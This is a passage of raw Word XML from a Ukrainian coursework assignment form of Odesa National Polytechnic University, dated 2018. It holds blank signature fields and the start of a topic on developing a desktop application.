    <w:p w:rsidR="00CE73AC" w:rsidRDefault="00DC7E52" w:rsidP="00CE73AC">
      <w:pPr>
        <w:jc w:val="right"/>
        <w:rPr>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">       </w:t>
      </w:r>
      <w:r w:rsidR="007D0939">
        <w:t xml:space="preserve">Члени </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007D0939">
        <w:t>комісії</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CE73AC">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00073DDF">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">          </w:t>
      </w:r>
      <w:r w:rsidR="00CE73AC">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">          </w:t>
      </w:r>
      <w:r w:rsidR="00CE73AC" w:rsidRPr="00D666D6">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidR="00CE73AC">
        <w:t xml:space="preserve">       </w:t>
      </w:r>
      <w:r w:rsidR="00CE73AC">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">                 </w:t>
      </w:r>
      <w:r w:rsidR="00CE73AC" w:rsidRPr="00D666D6">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidR="00CE73AC">
        <w:rPr>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r w:rsidR="00CE73AC">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">                 </w:t>
      </w:r>
      <w:r w:rsidR="00CE73AC" w:rsidRPr="00D666D6">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidR="00CE73AC">
        <w:rPr>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CE73AC" w:rsidRPr="00CE73AC" w:rsidRDefault="00CE73AC" w:rsidP="00CE73AC">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                                                                         </w:t>
      </w:r>
      <w:r w:rsidR="00DC7E52">
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00CE73AC">
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00CE73AC">
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>підпис</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CE73AC">
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">           </w:t>
      </w:r>
      <w:r w:rsidRPr="00CE73AC">
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CE73AC">
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>прізвище</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CE73AC">
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> та </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CE73AC">
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ініціали</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CE73AC">
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CE73AC" w:rsidRDefault="00CE73AC" w:rsidP="00CE73AC">
      <w:pPr>
        <w:jc w:val="right"/>
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">                           </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">       </w:t>
      </w:r>
      <w:r w:rsidRPr="00CE73AC">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">                                       </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CE73AC" w:rsidRDefault="00CE73AC" w:rsidP="00CE73AC">
      <w:pPr>
        <w:jc w:val="right"/>
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CE73AC">
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00CE73AC">
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>підпис</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CE73AC">
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">           </w:t>
      </w:r>
      <w:r w:rsidRPr="00CE73AC">
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CE73AC">
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>прізвище</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CE73AC">
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> та </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CE73AC">
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ініціали</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CE73AC">
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CE73AC" w:rsidRDefault="00CE73AC" w:rsidP="00CE73AC">
      <w:pPr>
        <w:jc w:val="right"/>
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">      </w:t>
      </w:r>
      <w:r w:rsidRPr="00CE73AC">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">                   </w:t>
      </w:r>
      <w:r w:rsidRPr="00D666D6">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">       </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">                  </w:t>
      </w:r>
      <w:r w:rsidRPr="00D666D6">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">                   </w:t>
      </w:r>
      <w:r w:rsidRPr="00D666D6">
        <w:rPr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D0939" w:rsidRPr="007D0939" w:rsidRDefault="00CE73AC" w:rsidP="00CE73AC">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                                                                   </w:t>
      </w:r>
      <w:r w:rsidR="00DC7E52">
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r w:rsidR="007D0939" w:rsidRPr="007D0939">
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="007D0939">
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>п</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ідпис</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">)   </w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>прізвище</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> та </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ініціали</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="007D0939">
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D0939" w:rsidRDefault="007D0939" w:rsidP="007D0939">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00C95742" w:rsidRDefault="00DC7E52" w:rsidP="007D0939">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>м.</w:t>
      </w:r>
      <w:r w:rsidR="007D0939">
        <w:t>Одеса</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007D0939">
        <w:t xml:space="preserve"> – 2018 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007D0939">
        <w:t>рік</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00F224D9" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="3" w:line="269" w:lineRule="auto"/>
        <w:ind w:left="2017" w:hanging="10"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Одеський</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національний</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>політехнічний</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університет</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00F224D9" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="3" w:line="269" w:lineRule="auto"/>
        <w:ind w:left="3203" w:right="2241" w:firstLine="58"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Інститут</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комп'ютерних</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> систем Кафедра </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>інформаційних</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> систем </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="26"/>
        <w:ind w:right="76"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="26"/>
        <w:ind w:right="76"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00F224D9" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="26"/>
        <w:ind w:right="76"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">ЗАВДАННЯ </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00F224D9" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="27" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00F224D9" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="10" w:right="82" w:hanging="10"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">НА КУРСОВУ РОБОТУ </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00F224D9" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:right="5"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00F224D9" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="3" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">                                      </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">              </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">                      </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">                              </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">                                 </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">             </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">          </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00DC7E52" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="3" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>прізвище</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ім’я</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">, по </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>батькові</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">)   </w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F224D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група</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">) </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00F224D9" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="24" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00F224D9" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:hanging="369"/>
      </w:pPr>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Тема </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>роботи</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> “</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t>Розробка</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t>десктопного</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
